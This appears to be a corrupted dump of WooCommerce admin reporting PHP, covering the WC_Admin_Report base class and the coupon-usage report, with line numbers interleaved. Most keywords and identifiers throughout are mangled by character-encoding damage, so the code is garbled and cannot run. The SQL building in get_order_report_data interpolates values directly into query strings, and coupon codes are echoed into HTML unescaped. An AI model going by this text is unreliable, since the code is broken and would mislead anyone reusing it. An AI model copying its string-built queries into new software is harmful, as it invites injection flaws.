Ğ'woocomm”û_v¬ŸtiÚ_İtiÚs', 
$loİ
, 
$v¬ŸtiÚ_d©a
, 
$v¬ŸtiÚ
 ); ?>

217 </
	gtd
>

218 </
	gŒ
>

219 </
	gtbody
>

220 </
	gbË
>

221 </
	gdiv
>

	@includes/admin/reports/class-wc-admin-report.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Admš_R•Üt
 {

16 
public
 
	m$ch¬t_š‹rv®
;

17 
public
 
	m$group_by_qu”y
;

18 
public
 
	m$b¬width
;

19 
public
 
	m$ch¬t_groupby
;

20 
public
 
	m$¡¬t_d©e
;

21 
public
 
	m$’d_d©e
;

37 
public
 
funùiÚ
 
g‘_Üd”_»pÜt_d©a
Ğ
$¬gs
 = 
	$¬¿y
() ) {

38 
glob®
 
$wpdb
;

40 
$deçuÉs
 = 
	`¬¿y
(

41 'd©a' => 
	`¬¿y
(),

42 'wh”e' => 
	`¬¿y
(),

43 'wh”e_m‘a' => 
	`¬¿y
(),

48 'f‹r_¿nge' => 
çl£
,

49 'noÿche' => 
çl£
,

50 'debug' => 
çl£


53 
$¬gs
 = 
	`wp_·r£_¬gs
Ğ$¬gs, 
$deçuÉs
 );

55 
	`exŒaù
Ğ
$¬gs
 );

57 iàĞ
	`em±y
Ğ
$d©a
 ) )

58  
çl£
;

60 
$£Ëù
 = 
	`¬¿y
();

62 
	`fÜ—ch
 ( 
$d©a
 
as
 
$key
 => 
$v®ue
 ) {

63 
$di¡šù
 = '';

65 iàĞ
	`is£t
Ğ
$v®ue
['distinct'] ) )

66 
$di¡šù
 = 'DISTINCT';

68 iàĞ
$v®ue
['type'] == 'meta' )

69 
$g‘_key
 = "meta_{$key}.meta_value";

70 
	`–£if
Ğ
$v®ue
['type'] == 'post_data' )

71 
$g‘_key
 = "posts.{$key}";

72 
	`–£if
Ğ
$v®ue
['type'] == 'order_item_meta' )

73 
$g‘_key
 = "order_item_meta_{$key}.meta_value";

74 
	`–£if
Ğ
$v®ue
['type'] == 'order_item' )

75 
$g‘_key
 = "order_items.{$key}";

77 iàĞ
$v®ue
['function'] )

78 
$g‘
 = "{$value['function']}({$distinct} {$get_key})";

80 
$g‘
 = "{$distinct} {$get_key}";

82 
$£Ëù
[] = "{$get}‡s {$value['name']}";

85 
$qu”y
['£Ëù'] = "SELECT " . 
	`im¶ode
Ğ',', 
$£Ëù
 );

86 
$qu”y
['from'] = "FROM {$wpdb->posts} AS…osts";

89 
$jošs
 = 
	`¬¿y
();

90 
$jošs
['rel'] = "LEFT JOIN {$wpdb->term_relationships} AS„el ON…osts.ID=rel.object_ID";

91 
$jošs
['tax'] = "LEFT JOIN {$wpdb->term_taxonomy} ASax USING(erm_taxonomy_id )";

92 
$jošs
['term'] = "LEFT JOIN {$wpdb->terms} ASerm USING(erm_id )";

94 
	`fÜ—ch
 ( 
$d©a
 
as
 
$key
 => 
$v®ue
 ) {

95 iàĞ
$v®ue
['type'] == 'meta' ) {

97 
$jošs
["meta_{$key}"] = "LEFT JOIN {$wpdb->postmeta} AS meta_{$key} ON…osts.ID = meta_{$key}.post_id";

99 } 
	`–£if
 ( 
$v®ue
['type'] == 'order_item_meta' ) {

101 
$jošs
["order_items"] = "LEFT JOIN {$wpdb->prefix}woocommerce_order_items AS order_items ON…osts.ID = order_items.order_id";

102 
$jošs
["order_item_meta_{$key}"] = "LEFT JOIN {$wpdb->prefix}woocommerce_order_itemmeta AS order_item_meta_{$key} ON order_items.order_item_id = order_item_meta_{$key}.order_item_id";

104 } 
	`–£if
 ( 
$v®ue
['type'] == 'order_item' ) {

106 
$jošs
["order_items"] = "LEFT JOIN {$wpdb->prefix}woocommerce_order_items AS order_items ON…osts.ID = order_items.order_id";

111 iàĞ! 
	`em±y
Ğ
$wh”e_m‘a
 ) ) {

112 
	`fÜ—ch
 ( 
$wh”e_m‘a
 
as
 
$v®ue
 ) {

113 iàĞ! 
	`is_¬¿y
Ğ
$v®ue
 ) )

116 
$key
 = 
	`is_¬¿y
Ğ
$v®ue
['meta_key'] ) ? $value['meta_key'][0] . '_array' : $value['meta_key'];

118 iàĞ
	`is£t
Ğ
$v®ue
['type'] ) && $value['type'] == 'order_item_meta' ) {

120 
$jošs
["order_items"] = "LEFT JOIN {$wpdb->prefix}woocommerce_order_items AS order_items ON…osts.ID = order_items.order_id";

121 
$jošs
["order_item_meta_{$key}"] = "LEFT JOIN {$wpdb->prefix}woocommerce_order_itemmeta AS order_item_meta_{$key} ON order_items.order_item_id = order_item_meta_{$key}.order_item_id";

125 
$jošs
["meta_{$key}"] = "LEFT JOIN {$wpdb->postmeta} AS meta_{$key} ON…osts.ID = meta_{$key}.post_id";

130 
$qu”y
['još'] = 
	`im¶ode
Ğ' ', 
$jošs
 );

132 
$qu”y
['where'] = "

133 
WHERE
 
po¡s
.
po¡_ty³
 = 'shop_order'

134 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

135 
AND
 
x
.
xÚomy
 = 'shop_order_status'

136 
AND
 
‹rm
.
¦ug
 
	`IN
 ('" . im¶odeĞ"','",‡µly_f‹rsĞ'
woocomm”û_»pÜts_Üd”_¡©u£s
',‡¼ayĞ'
com¶‘ed
', '
´oûssšg
', '
Ú
-
hŞd
' ) ) ) . "')

139 iàĞ
$f‹r_¿nge
 ) {

140 
$qu”y
['where'] .= "

141 
AND
 
po¡_d©e
 >ğ'" . d©e('
Y
-
m
-
d
', $this->start_date ) . "'

142 
AND
 
po¡_d©e
 < '" . d©e('
Y
-
m
-
d
', sŒtÙimeĞ'+1 
DAY
', $this->end_date ) ) . "'

146 
	`fÜ—ch
 ( 
$d©a
 
as
 
$key
 => 
$v®ue
 ) {

147 iàĞ
$v®ue
['type'] == 'meta' ) {

149 
$qu”y
['where'] .= " AND meta_{$key}.meta_key = '{$key}'";

151 } 
	`–£if
 ( 
$v®ue
['type'] == 'order_item_meta' ) {

153 
$qu”y
['where'] .= " AND order_items.order_item_type = '{$value['order_item_type']}'";

154 
$qu”y
['where'] .= " AND order_item_meta_{$key}.meta_key = '{$key}'";

159 iàĞ! 
	`em±y
Ğ
$wh”e_m‘a
 ) ) {

160 
$»ÏtiÚ
 = 
	`is£t
Ğ
$wh”e_m‘a
['relation'] ) ? $where_meta['relation'] : 'AND';

162 
$qu”y
['where'] .= " AND (";

164 
	`fÜ—ch
 ( 
$wh”e_m‘a
 
as
 
$šdex
 => 
$v®ue
 ) {

165 iàĞ! 
	`is_¬¿y
Ğ
$v®ue
 ) )

168 
$key
 = 
	`is_¬¿y
Ğ
$v®ue
['meta_key'] ) ? $value['meta_key'][0] . '_array' : $value['meta_key'];

170 iàĞ
	`¡¹Şow”
Ğ
$v®ue
['operator'] ) == 'in' ) {

171 iàĞ
	`is_¬¿y
Ğ
$v®ue
['meta_value'] ) )

172 
$v®ue
['m‘a_v®ue'] = 
	`im¶ode
( "','", $value['meta_value'] );

173 iàĞ! 
	`em±y
Ğ
$v®ue
['meta_value'] ) )

174 
$wh”e_v®ue
 = "IN ('{$value['meta_value']}')";

176 
$wh”e_v®ue
 = "{$value['operator']} '{$value['meta_value']}'";

179 iàĞ! 
	`em±y
Ğ
$wh”e_v®ue
 ) ) {

180 iàĞ
$šdex
 > 0 )

181 
$qu”y
['wh”e'] .ğ' ' . 
$»ÏtiÚ
;

183 iàĞ
	`is£t
Ğ
$v®ue
['type'] ) && $value['type'] == 'order_item_meta' ) {

184 iàĞ
	`is_¬¿y
Ğ
$v®ue
['meta_key'] ) )

185 
$qu”y
['wh”e'] .ğ" ( ord”_™em_m‘a_{$key}.m‘a_key IN ('" . 
	`im¶ode
Ğ"','", 
$v®ue
['meta_key'] ) . "')";

187 
$qu”y
['where'] .= " ( order_item_meta_{$key}.meta_key = '{$value['meta_key']}'";

189 
$qu”y
['where'] .= " AND order_item_meta_{$key}.meta_value {$where_value} )";

191 iàĞ
	`is_¬¿y
Ğ
$v®ue
['meta_key'] ) )

192 
$qu”y
['wh”e'] .ğ" ( m‘a_{$key}.m‘a_key IN ('" . 
	`im¶ode
Ğ"','", 
$v®ue
['meta_key'] ) . "')";

194 
$qu”y
['where'] .= " ( meta_{$key}.meta_key = '{$value['meta_key']}'";

196 
$qu”y
['where'] .= " AND meta_{$key}.meta_value {$where_value} )";

201 
$qu”y
['where'] .= ")";

204 iàĞ! 
	`em±y
Ğ
$wh”e
 ) ) {

205 
	`fÜ—ch
 ( 
$wh”e
 
as
 
$v®ue
 ) {

206 iàĞ
	`¡¹Şow”
Ğ
$v®ue
['operator'] ) == 'in' ) {

207 iàĞ
	`is_¬¿y
Ğ
$v®ue
['value'] ) )

208 
$v®ue
['v®ue'] = 
	`im¶ode
( "','", $value['value'] );

209 iàĞ! 
	`em±y
Ğ
$v®ue
['value'] ) )

210 
$wh”e_v®ue
 = "IN ('{$value['value']}')";

212 
$wh”e_v®ue
 = "{$value['operator']} '{$value['value']}'";

215 iàĞ! 
	`em±y
Ğ
$wh”e_v®ue
 ) )

216 
$qu”y
['where'] .= " AND {$value['key']} {$where_value}";

220 iàĞ
$group_by
 ) {

221 
$qu”y
['group_by'] = "GROUP BY {$group_by}";

224 iàĞ
$Üd”_by
 ) {

225 
$qu”y
['order_by'] = "ORDER BY {$order_by}";

228 iàĞ
$lim™
 ) {

229 
$qu”y
['limit'] = "LIMIT {$limit}";

232 
$qu”y
 = 
	`­¶y_f‹rs
( 'woocommerce_reports_get_order_report_query', $query );

233 
$qu”y
 = 
	`im¶ode
( ' ', $query );

234 
$qu”y_hash
 = 
	`md5
Ğ
$qu”y_ty³
 . 
$qu”y
 );

235 
$ÿched_»suÉs
 = 
	`g‘_Œªs›Á
Ğ
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$this
 ) ) );

237 iàĞ
$debug
 ) {

238 
	`v¬_dump
Ğ
$qu”y
 );

241 iàĞ
$debug
 || 
$noÿche
 || 
çl£
 ==ğ
$ÿched_»suÉs
 || ! 
	`is£t
Ğ$ÿched_»suÉs[ 
$qu”y_hash
 ] ) ) {

242 
$ÿched_»suÉs
[ 
$qu”y_hash
 ] = 
	`­¶y_f‹rs
Ğ'woocomm”û_»pÜts_g‘_Üd”_»pÜt_d©a', 
$wpdb
->
	`$qu”y_ty³
Ğ
$qu”y
 ), 
$d©a
 );

243 
	`£t_Œªs›Á
Ğ
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$this
 ) ), 
$ÿched_»suÉs
, 
DAY_IN_SECONDS
 );

246 
$»suÉ
 = 
$ÿched_»suÉs
[ 
$qu”y_hash
 ];

248  
$»suÉ
;

262 
public
 
funùiÚ
 
	$´•¬e_ch¬t_d©a
Ğ
$d©a
, 
$d©e_key
, 
$d©a_key
, 
$š‹rv®
, 
$¡¬t_d©e
, 
$group_by
 ) {

263 
$´•¬ed_d©a
 = 
	`¬¿y
();

264 
$time
 = '';

267  
$i
 = 0; $˜<ğ
$š‹rv®
; $i ++ ) {

268  
$group_by
 ) {

270 
$time
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Ymd', sŒtÙimeĞ"+{$i} DAY", 
$¡¬t_d©e
 ) ) ) . '000';

273 
$time
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Ym', sŒtÙimeĞ"+{$i} MONTH", 
$¡¬t_d©e
 ) ) . '01' ) . '000';

277 iàĞ! 
	`is£t
Ğ
$´•¬ed_d©a
[ 
$time
 ] ) )

278 
$´•¬ed_d©a
[ 
$time
 ] = 
	`¬¿y
Ğ
	`esc_js
( $time ), 0 );

281 
	`fÜ—ch
 ( 
$d©a
 
as
 
$d
 ) {

282  
$group_by
 ) {

284 
$time
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Ymd', sŒtÙimeĞ
$d
->
$d©e_key
 ) ) ) . '000';

287 
$time
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Ym', sŒtÙimeĞ
$d
->
$d©e_key
 ) ) . '01' ) . '000';

291 iàĞ! 
	`is£t
Ğ
$´•¬ed_d©a
[ 
$time
 ] ) )

294 iàĞ
$d©a_key
 )

295 
$´•¬ed_d©a
[ 
$time
 ][1] +ğ
$d
->
$d©a_key
;

297 
$´•¬ed_d©a
[ 
$time
 ][1] ++;

300  
$´•¬ed_d©a
;

301 
	}
}

311 
public
 
funùiÚ
 
§Ës_¥¬klše
Ğ
$id
 = '', 
$days
 = 7, 
$ty³
 = 'sales' ) {

313 iàĞ
$id
 ) {

314 
$m‘a_key
 = 
$ty³
 == 'sales' ? '_line_total' : '_qty';

316 
	g$d©a
 = 
$this
->
g‘_Üd”_»pÜt_d©a
Ğ
¬¿y
(

317 'd©a' => 
¬¿y
(

318 '_´oduù_id' => 
¬¿y
(

324 
$m‘a_key
 => 
¬¿y
(

330 'po¡_d©e' => 
¬¿y
(

336 'wh”e' => 
¬¿y
(

337 
¬¿y
(

339 'v®ue' => 
d©e
Ğ'Y-m-d', 
¡¹Ùime
Ğ'midnighˆ-' . ( 
$days
 - 1 ) . ' days', 
cu¼’t_time
( 'timestamp' ) ) ),

342 
¬¿y
(

344 'v®ue' => 
$id
,

350 'f‹r_¿nge' => 
çl£


353 
	g$d©a
 = 
$this
->
g‘_Üd”_»pÜt_d©a
Ğ
¬¿y
(

354 'd©a' => 
¬¿y
(

355 '_Üd”_tÙ®' => 
¬¿y
(

360 'po¡_d©e' => 
¬¿y
(

366 'wh”e' => 
¬¿y
(

367 
¬¿y
(

369 'v®ue' => 
d©e
Ğ'Y-m-d', 
¡¹Ùime
Ğ'midnighˆ-' . ( 
$days
 - 1 ) . ' days', 
cu¼’t_time
( 'timestamp' ) ) ),

375 'f‹r_¿nge' => 
çl£


379 
	g$tÙ®
 = 0;

380 
fÜ—ch
 ( 
$d©a
 
as
 
$d
 )

381 
	g$tÙ®
 +ğ
$d
->
¥¬klše_v®ue
;

383 iàĞ
	g$ty³
 == 'sales' ) {

384 
$toŞt
 = 
¥rštf
Ğ
__
Ğ'SŞd % wÜth iÀthÏ¡ %d days', 'woocomm”û' ), 
¡r_gs
Ğ
wc_´iû
Ğ
$tÙ®
 ) ), 
$days
 );

386 
	g$toŞt
 = 
¥rštf
Ğ
_n
Ğ'SŞd 1 i‹m iÀthÏ¡ %d days', 'SŞd %d i‹m šhÏ¡ %d days', 
$tÙ®
, 'woocomm”û' ), $tÙ®, 
$days
 );

389 
	g$¥¬klše_d©a
 = 
¬¿y_v®ues
Ğ
$this
->
´•¬e_ch¬t_d©a
Ğ
$d©a
, 'po¡_d©e', '¥¬klše_v®ue', 
$days
 - 1, 
¡¹Ùime
Ğ'midnighˆ-' . ( $day - 1 ) . ' days', 
cu¼’t_time
( 'timestamp' ) ), 'day' ) );

391  '<¥ª cÏss="wc_¥¬klš' . ( 
	g$ty³
 =ğ'§Ës' ? 'lšes' : 'b¬s' ) . 's" d©a-cŞÜ="#777" d©a-t="' . 
esc_©Œ
Ğ
$toŞt
 ) . '" d©a-b¬width="' . 60*60*16*1000 . '" d©a-¥¬klše="' .ƒsc_©ŒĞ
jsÚ_’code
Ğ
$¥¬klše_d©a
 ) ) . '"></span>';

399 
public
 
funùiÚ
 
	$ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$cu¼’t_¿nge
 ) {

400  
$cu¼’t_¿nge
 ) {

402 
$this
->
¡¬t_d©e
 = 
	`¡¹Ùime
Ğ
	`§n™ize_‹xt_f›ld
Ğ
$_GET
['start_date'] ) );

403 
$this
->
’d_d©e
 = 
	`¡¹Ùime
Ğ'midnight', sŒtÙimeĞ
	`§n™ize_‹xt_f›ld
Ğ
$_GET
['end_date'] ) ) );

405 iàĞ! 
$this
->
’d_d©e
 )

406 
$this
->
’d_d©e
 = 
	`cu¼’t_time
('timestamp');

408 
$š‹rv®
 = 0;

409 
$mš_d©e
 = 
$this
->
¡¬t_d©e
;

410  ( 
$mš_d©e
 = 
	`¡¹Ùime
Ğ"+1 MONTH", $mš_d©èè<ğ
$this
->
’d_d©e
 ) {

411 
$š‹rv®
 ++;

415 iàĞ
$š‹rv®
 > 3 )

416 
$this
->
ch¬t_groupby
 = 'month';

418 
$this
->
ch¬t_groupby
 = 'day';

421 
$this
->
¡¬t_d©e
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Y-01-01', 
	`cu¼’t_time
('timestamp') ) );

422 
$this
->
’d_d©e
 = 
	`¡¹Ùime
Ğ'midnight', 
	`cu¼’t_time
( 'timestamp' ) );

423 
$this
->
ch¬t_groupby
 = 'month';

426 
$this
->
¡¬t_d©e
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Y-m-01', sŒtÙimeĞ'-1 MONTH', 
	`cu¼’t_time
('timestamp') ) ) );

427 
$this
->
’d_d©e
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Y-m-t', sŒtÙimeĞ'-1 MONTH', 
	`cu¼’t_time
('timestamp') ) ) );

428 
$this
->
ch¬t_groupby
 = 'day';

431 
$this
->
¡¬t_d©e
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Y-m-01', 
	`cu¼’t_time
('timestamp') ) );

432 
$this
->
’d_d©e
 = 
	`¡¹Ùime
Ğ'midnight', 
	`cu¼’t_time
( 'timestamp' ) );

433 
$this
->
ch¬t_groupby
 = 'day';

436 
$this
->
¡¬t_d©e
 = 
	`¡¹Ùime
Ğ'-6 days', 
	`cu¼’t_time
( 'timestamp' ) );

437 
$this
->
’d_d©e
 = 
	`¡¹Ùime
Ğ'midnight', 
	`cu¼’t_time
( 'timestamp' ) );

438 
$this
->
ch¬t_groupby
 = 'day';

443  
$this
->
ch¬t_groupby
 ) {

445 
$this
->
group_by_qu”y
 = 'YEAR(post_date), MONTH(post_date), DAY(post_date)';

446 
$this
->
ch¬t_š‹rv®
 = 
	`û
Ğ
	`max
Ğ0, ( $this->
’d_d©e
 - $this->
¡¬t_d©e
 ) / ( 60 * 60 * 24 ) ) );

447 
$this
->
b¬width
 = 60 * 60 * 24 * 1000;

450 
$this
->
group_by_qu”y
 = 'YEAR(post_date), MONTH(post_date)';

451 
$this
->
ch¬t_š‹rv®
 = 0;

452 
$mš_d©e
 = 
$this
->
¡¬t_d©e
;

453  ( 
$mš_d©e
 = 
	`¡¹Ùime
Ğ"+1 MONTH", $mš_d©èè<ğ
$this
->
’d_d©e
 ) {

454 
$this
->
ch¬t_š‹rv®
 ++;

456 
$this
->
b¬width
 = 60 * 60 * 24 * 7 * 4 * 1000;

459 
	}
}

465 
public
 
funùiÚ
 
	$g‘_maš_ch¬t
(è{
	}
}

471 
public
 
funùiÚ
 
	$g‘_ch¬t_Ëg’d
() {

472  
	`¬¿y
();

473 
	}
}

479 
public
 
funùiÚ
 
	$g‘_ch¬t_widg‘s
() {

480  
	`¬¿y
();

481 
	}
}

486 
public
 
funùiÚ
 
	$g‘_expÜt_bu‰Ú
(è{
	}
}

491 
public
 
funùiÚ
 
	$ouut_»pÜt
(è{
	}
}

	@includes/admin/reports/class-wc-report-coupon-usage.php

1 <?
php


10 şas 
	cWC_R•Üt_CoupÚ_U§ge
 
ex‹nds
 
	mWC_Admš_R•Üt
 {

12 
public
 
	m$ch¬t_cŞours
 = 
¬¿y
();

13 
public
 
	m$coupÚ_codes
 = 
¬¿y
();

18 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

19 iàĞ
	`is£t
Ğ
$_GET
['coupÚ_codes'] ) && 
	`is_¬¿y
( $_GET['coupon_codes'] ) ) {

20 
$this
->
coupÚ_codes
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'§n™ize_‹xt_f›ld', 
$_GET
['coupon_codes'] ) );

21 } 
	`–£if
 ( 
	`is£t
Ğ
$_GET
['coupon_codes'] ) ) {

22 
$this
->
coupÚ_codes
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y
Ğ
	`§n™ize_‹xt_f›ld
Ğ
$_GET
['coupon_codes'] ) ) );

30 
public
 
funùiÚ
 
	$g‘_ch¬t_Ëg’d
() {

31 
$Ëg’d
 = 
	`¬¿y
();

33 
$tÙ®_discouÁ
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

34 'd©a' => 
	`¬¿y
(

35 'discouÁ_amouÁ' => 
	`¬¿y
(

42 'wh”e' => 
	`¬¿y
(

43 
	`¬¿y
(

46 'v®ue' => 
$this
->
coupÚ_codes
,

51 'f‹r_¿nge' => 
Œue


54 
$tÙ®_coupÚs
 = 
	`absšt
Ğ
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

55 'd©a' => 
	`¬¿y
(

56 'Üd”_™em_Çme' => 
	`¬¿y
(

63 'wh”e' => 
	`¬¿y
(

64 
	`¬¿y
(

67 'v®ue' => 
$this
->
coupÚ_codes
,

72 'f‹r_¿nge' => 
Œue


75 
$Ëg’d
[] = 
	`¬¿y
(

76 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% discouÁ šÙ®', 'woocomm”û' ), '<¡rÚg>' . 
	`wc_´iû
Ğ
$tÙ®_discouÁ
 ) . '</strong>' ),

77 'cŞÜ' => 
$this
->
ch¬t_cŞours
['discount_amount'],

81 
$Ëg’d
[] = 
	`¬¿y
(

82 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% coupÚ u£d iÀtÙ®', 'woocomm”û' ), '<¡rÚg>' . 
$tÙ®_coupÚs
 . '</strong>' ),

83 'cŞÜ' => 
$this
->
ch¬t_cŞours
['coupon_count' ],

87  
$Ëg’d
;

88 
	}
}

93 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

94 
$¿nges
 = 
	`¬¿y
(

95 'y—r' => 
	`__
( 'Year', 'woocommerce' ),

96 'Ï¡_mÚth' => 
	`__
( 'Last Month', 'woocommerce' ),

97 'mÚth' => 
	`__
( 'This Month', 'woocommerce' ),

98 '7day' => 
	`__
( 'Last 7 Days', 'woocommerce' )

101 
$this
->
ch¬t_cŞours
 = 
	`¬¿y
(

106 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

108 iàĞ! 
	`š_¬¿y
Ğ
$cu¼’t_¿nge
, 
	`¬¿y
( 'custom', 'year', 'last_month', 'month', '7day' ) ) ) {

109 
$cu¼’t_¿nge
 = '7day';

112 
$this
->
	`ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$cu¼’t_¿nge
 );

114 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-report-by-date.php');

115 
	}
}

121 
public
 
funùiÚ
 
	$g‘_ch¬t_widg‘s
() {

122 
$widg‘s
 = 
	`¬¿y
();

124 
$widg‘s
[] = 
	`¬¿y
(

126 'ÿÎback' => 
	`¬¿y
Ğ
$this
, 'coupons_widget' )

129  
$widg‘s
;

130 
	}
}

136 
public
 
funùiÚ
 
	$coupÚs_widg‘
() {

138 <
h4
 
şass
="£ùiÚ_t™Ë"><
¥ª
><?
php
 
	`_e
( 'Filter by coupon', 'woocommerce' ); ?></span></h4>

139 <
div
 
şass
="section">

140 <
fÜm
 
m‘hod
="GET">

141 <
div
>

142 <?
php


143 
$u£d_coupÚs
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

144 'd©a' => 
	`¬¿y
(

145 'Üd”_™em_Çme' => 
	`¬¿y
(

149 'di¡šù' => 
Œue
,

153 'wh”e' => 
	`¬¿y
(

154 
	`¬¿y
(

161 'f‹r_¿nge' => 
çl£


164 iàĞ
$u£d_coupÚs
 ) :

166 <
£Ëù
 
id
="coupÚ_codes" 
Çme
="coupÚ_codes" 
şass
="cho£n_£Ëù" 
d©a
-
¶aûhŞd”
="<?ph°_eĞ'Choo£ coupÚs&h–l;', 'woocomm”û' ); ?>" 
¡yË
="width:100%;">

167 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'All coupons', 'woocommerce' ); ?></option>

168 <?
php


169 
	`fÜ—ch
 ( 
$u£d_coupÚs
 
as
 
$coupÚ
 ) {

170 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$coupÚ
 ) . '" ' . 
	`£Ëùed
Ğ
	`š_¬¿y
Ğ$coupÚ, 
$this
->
coupÚ_codes
 ), 
Œue
, 
çl£
 ) . '>' . $coupon . '</option>';

173 </
£Ëù
>

174 <
šput
 
ty³
="subm™" 
şass
="subm™ bu‰Ú" 
v®ue
="<?php _e( 'Show', 'woocommerce' ); ?>" />

175 <
šput
 
ty³
="hidd’" 
Çme
="¿nge" 
v®ue
="<?php if ( !ƒmpty( $_GET['range'] ) )ƒchoƒsc_attr( $_GET['range'] ) ?>" />

176 <
šput
 
ty³
="hidd’" 
Çme
="¡¬t_d©e" 
v®ue
="<?php if ( !ƒmpty( $_GET['start_date'] ) )ƒchoƒsc_attr( $_GET['start_date'] ) ?>" />

177 <
šput
 
ty³
="hidd’" 
Çme
="’d_d©e" 
v®ue
="<?php if ( !ƒmpty( $_GET['end_date'] ) )ƒchoƒsc_attr( $_GET['end_date'] ) ?>" />

178 <
šput
 
ty³
="hidd’" 
Çme
="·ge" 
v®ue
="<?php if ( !ƒmpty( $_GET['page'] ) )ƒchoƒsc_attr( $_GET['page'] ) ?>" />

179 <
šput
 
ty³
="hidd’" 
Çme
="b" 
v®ue
="<?php if ( !ƒmpty( $_GET['tab'] ) )ƒchoƒsc_attr( $_GET['tab'] ) ?>" />

180 <
šput
 
ty³
="hidd’" 
Çme
="»pÜt" 
v®ue
="<?php if ( !ƒmpty( $_GET['report'] ) )ƒchoƒsc_attr( $_GET['report'] ) ?>" />

181 <
süt
 
ty³
="text/javascript">

182 
	`jQu”y
(
	`funùiÚ
() {

183 
	`jQu”y
('£Ëù.cho£n_£Ëù').
	`cho£n
();

185 </
süt
>

186 <?
php
 : ?>

187 <
¥ª
><?
php
 
	`_e
( 'No used coupons found', 'woocommerce' ); ?></span>

188 <?
php
 
’dif
; ?>

189 </
div
>

190 </
fÜm
>

191 </
div
>

192 <
h4
 
şass
="£ùiÚ_t™Ë"><
¥ª
><?
php
 
	`_e
( 'Most Popular', 'woocommerce' ); ?></span></h4>

193 <
div
 
şass
="section">

194 <
bË
 
ûÎ¥acšg
="0">

195 <?
php


196 
$mo¡_pİuÏr
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

197 'd©a' => 
	`¬¿y
(

198 'Üd”_™em_Çme' => 
	`¬¿y
(

204 'Üd”_™em_id' => 
	`¬¿y
(

211 'wh”e' => 
	`¬¿y
(

212 
	`¬¿y
(

223 'f‹r_¿nge' => 
Œue


226 iàĞ
$mo¡_pİuÏr
 ) {

227 
	`fÜ—ch
 ( 
$mo¡_pİuÏr
 
as
 
$coupÚ
 ) {

228 
echo
 '<Œ cÏss="' . ( 
	`š_¬¿y
Ğ
$coupÚ
->
coupÚ_code
, 
$this
->
coupÚ_codes
 ) ? 'active' : '' ) . '">

229 <
td
 
şass
="couÁ" 
width
="1%">' . $coupon->coupon_count . '</td>

230 <
td
 
şass
="Çme"><
a
 
h»f
="' .‡dd_query_arg( 'coupon_codes', $coupon->coupon_code ) . '">' . $coupon->coupon_code . '</a></td>

231 </
Œ
>';

234 
echo
 '<Œ><td cŞ¥ª="2">' . 
	`__
( 'No coupons found in„ange', 'woocommerce' ) . '</td></tr>';

237 </
bË
>

238 </
div
>

239 <
h4
 
şass
="£ùiÚ_t™Ë"><
¥ª
><?
php
 
	`_e
( 'Most Discount', 'woocommerce' ); ?></span></h4>

240 <
div
 
şass
="section">

241 <
bË
 
ûÎ¥acšg
="0">

242 <?
php


243 
$mo¡_discouÁ
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

244 'd©a' => 
	`¬¿y
(

245 'Üd”_™em_Çme' => 
	`¬¿y
(

251 'discouÁ_amouÁ' => 
	`¬¿y
(

258 'wh”e' => 
	`¬¿y
(

259 
	`¬¿y
(

270 'f‹r_¿nge' => 
Œue


273 iàĞ
$mo¡_discouÁ
 ) {

274 
	`fÜ—ch
 ( 
$mo¡_discouÁ
 
as
 
$coupÚ
 ) {

275 
echo
 '<Œ cÏss="' . ( 
	`š_¬¿y
Ğ
$coupÚ
->
coupÚ_code
, 
$this
->
coupÚ_codes
 ) ? 'active' : '' ) . '">

276 <
td
 
şass
="couÁ" 
width
="1%">' . wc_price( $coupon->discount_amount ) . '</td>

277 <
td
 
şass
="Çme"><
a
 
h»f
="' .‡dd_query_arg( 'coupon_codes', $coupon->coupon_code ) . '">' . $coupon->coupon_code . '</a></td>

278 </
Œ
>';

281 
echo
 '<Œ><td cŞ¥ª="3">' . 
	`__
( 'No coupons found in„ange', 'woocommerce' ) . '</td></tr>';

284 </
bË
>

285 </
div
>

286 <
süt
 
ty³
="text/javascript">

287 
	`jQu”y
('.£ùiÚ_t™Ë').
	`şick
(
	`funùiÚ
(){

288 
v¬
 
Ãxt_£ùiÚ
 = 
	`jQu”y
(
this
).
	`Ãxt
('.section');

290 iàĞ
	`jQu”y
(
Ãxt_£ùiÚ
).
	`is
(':visible') )

291  
çl£
;

293 
	`jQu”y
('.£ùiÚ:visibË').
	`¦ideUp
();

294 
	`jQu”y
('.£ùiÚ_t™Ë').
	`»moveCÏss
('open');

295 
	`jQu”y
(
this
).
	`addCÏss
('İ’').
	`Ãxt
('.£ùiÚ').
	`¦ideDown
();

297  
çl£
;

299 
	`jQu”y
('.£ùiÚ').
	`¦ideUp
Ğ100, 
	`funùiÚ
() {

300 <?
php
 iàĞ
	`em±y
Ğ
$this
->
coupÚ_codes
 ) ) : ?>

301 
	`jQu”y
('.£ùiÚ_t™Ë:eq(1)').
	`şick
();

302 <?
php
 : ?>

303 
